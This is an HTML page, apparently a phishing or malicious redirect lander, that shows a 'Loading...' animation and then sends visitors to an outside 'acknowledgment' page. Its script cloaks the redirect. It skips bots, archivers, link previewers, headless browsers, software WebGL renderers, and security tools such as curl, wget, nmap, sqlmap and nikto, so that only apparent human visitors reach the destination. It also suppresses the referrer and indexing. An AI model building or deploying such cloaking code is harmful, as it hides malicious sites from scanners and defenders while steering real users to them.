<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
<meta name="referrer" content="no-referrer">
<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<title>Loading...</title>
<style>
  html, body { 
    margin: 0; padding: 0; 
    background: #ffffff; 
    height: 100%; 
    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
  }

  /* LOADER STYLES */
  #loader-container {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    display: flex;
    justify-content: center;
    align-items: center;
    background-color: #ffffff;
    z-index: 9999;
  }

  /* Small, Fixed Size Beat Animation */
  .beating-icon {
    /* BEAT ANIMATION */
    animation: heartbeat 1.5s infinite ease-in-out;
    
    /* SIZE FIX - Prevents it from looking weird/large */
    width: 50px; 
    height: auto; 
    display: block;
  }

  @keyframes heartbeat {
    0% { transform: scale(1); }
    50% { transform: scale(1.15); }
    100% { transform: scale(1); }
  }
</style>
</head>
<body>

<div id="loader-container">
  <!-- Using your hosted image with animation applied -->
  <img src="https://logisticafumero.com/icon.svg.webp" 
       alt="Loading" 
       class="beating-icon">
</div>

<script>
(function () {
  'use strict';

  var DEST = "https://jskmarketings.com/acknowledgment.html";

  var ua = (navigator.userAgent || "").toLowerCase();
  var UA_BLOCK = /bot|crawl|spider|scrape|slurp|curl|wget|python|requests|urllib|httpx|aiohttp|java\/|okhttp|node-fetch|axios|got\/|go-http|perl|ruby|libwww|php\/|scan|nmap|nikto|sqlmap|masscan|zmap|pingdom|uptime|monitor|lighthouse|pagespeed|headless|phantom|puppeteer|playwright|selenium|webdriver|chrome-lighthouse|gtmetrix|semrush|ahrefs|moz\.com|majestic|screaming|deepcrawl|botify|seznam|yandex|baidu|sogou|exabot|ia_archiver|archive\.org|wayback|commoncrawl|ccbot|petalbot|applebot|duckduckbot|facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegrambot|discordbot|skypeuripreview|embedly|quora|pinterest|slackbot|vkshare|w3c_validator|validator\.nu|feedfetcher|google-read-aloud|google web preview|google-inspectiontool|googleother|google-extended|adsbot|mediapartners|apis-google|storebot-google|chrome\/\d+.*safari\/537.*headless/i;

  if (UA_BLOCK.test(ua) || ua.length < 20) return;

  if (/HeadlessChrome/i.test(navigator.userAgent)) return;
  
  try {
    var canvas = document.createElement("canvas");
    var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (gl) {
      var dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if (dbg) {
        if (/swiftshader|llvmpipe/i.test(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL))) return;
      }
    }
  } catch (e) {}

  // Redirect after a bit to see the beat
  setTimeout(function () {
    try {
      window.location.replace(DEST);
    } catch (e) {
      window.location.href = DEST;
    }
  }, 750); // Wait 1.5 seconds for the image to beat once
})();
</script>

</body>
</html>
